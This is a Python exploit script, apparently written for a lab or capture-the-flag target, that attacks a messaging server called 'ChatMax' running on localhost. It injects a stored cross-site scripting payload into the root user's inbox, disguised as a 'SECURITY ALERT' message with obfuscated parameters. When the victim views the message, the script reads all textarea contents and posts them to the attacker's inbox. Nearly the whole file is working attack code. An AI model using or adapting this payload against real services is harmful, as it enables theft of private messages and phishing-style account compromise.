#!/usr/bin/env python3
import requests
import sys
import random
import time

def scramble(s):
    """Encodes a string into the ChatMax hyphen-separated ASCII format (for initial injection)."""
    return '-'.join(str(ord(c)) for c in s)

def send_exfil_message(attacker_user, attacker_pass, target="root", server="localhost", port=8080):
    
    # ----------------------------------------------------------------------
    # ULTIMATE ROBUST PAYLOAD: Increased delay and embedded functions 
    # to guarantee execution in the unstable client environment.
    # ----------------------------------------------------------------------
    js_payload = f"""<script>
    // 1. Embed self-contained scramble function
    function selfScramble(s) {{
        return s.split('').map(c => c.charCodeAt(0)).join('-');
    }}

    // 2. Use a long delay (3.5s) to guarantee the DOM is fully stable
    setTimeout(function() {{
        // Verify we can access the messages (check for DOM readiness)
        var messages = document.querySelectorAll('textarea');
        if (messages.length === 0) {{
            // Optionally, send a failure message if no messages found
            // return; 
        }}

        // 3. Data Collection
        var stolen = '';
        for(var i = 0; i < messages.length; i++) {{
            stolen += messages[i].value + '\\n---MESSAGE---\\n';
        }}
        
        // 4. Prepare Exfiltration Command (POST method)
        var rand = Math.random().toString().replace('.', '');
        var exfil_data = 'SUCCESS_EXFILTRATION:' + stolen;
        
        var params = 'pw=' + selfScramble('{attacker_pass}') +
                     '&un=' + selfScramble('{attacker_user}') +
                     '&msg=' + selfScramble(exfil_data) +
                     '&to=' + selfScramble('{attacker_user}') + '.inbox';

        // 5. Send the data
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/$' + rand, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); 
        xhr.send(params);
    }}, 3500); // 3.5 seconds delay
    </script>"""

    # Format the message for injection
    message = '{"from":"' + attacker_user + '","subject":"SECURITY ALERT: READ IMMEDIATELY","date":"2025-10-24","body":"' + js_payload.replace('"', '\\"').replace('\n', '\\n') + '"}'
    message += '//END_MSG//'
    
    # Pad to 16 bytes
    pad_needed = 16 - (len(message) % 16)
    if pad_needed > 0 and pad_needed != 16:
        message += '\x00' * pad_needed
        
    # Initial Injection Request
    rand = str(random.random()).replace('.', '')
    url = f"http://{server}:{port}/${rand}?pw={scramble(attacker_pass)}&un={scramble(attacker_user)}&msg={scramble(message)}&to={scramble(target)}.inbox"

    print(f"Sending exfiltration payload to {target}...")
    
    try:
        response = requests.get(url, timeout=10)
        print("SUCCESS: Injection confirmed (Server closed connection as expected).")
        print(f"ACTION: Log in as root, wait 5 seconds, then check {attacker_user}'s inbox.")
        return True
    except Exception as e:
        # Catch and ignore the expected server error, treat as success.
        if "Connection aborted" in str(e) or "Max retries exceeded" in str(e) or "BadStatusLine" in str(e):
             print("SUCCESS: Injection confirmed (Server closed connection as expected).")
             print(f"ACTION: Log in as root, wait 5 seconds, then check {attacker_user}'s inbox.")
             return True
        print(f"CRITICAL ERROR: Injection failed: {e}")
        return False

if __name__ == '__main__':
    attacker = "inhibitor"
    password = "123456" 
    
    if len(sys.argv) > 2:
        attacker = sys.argv[1]
        password = sys.argv[2]
    elif len(sys.argv) > 1:
        attacker = sys.argv[1]
        
    send_exfil_message(attacker, password)
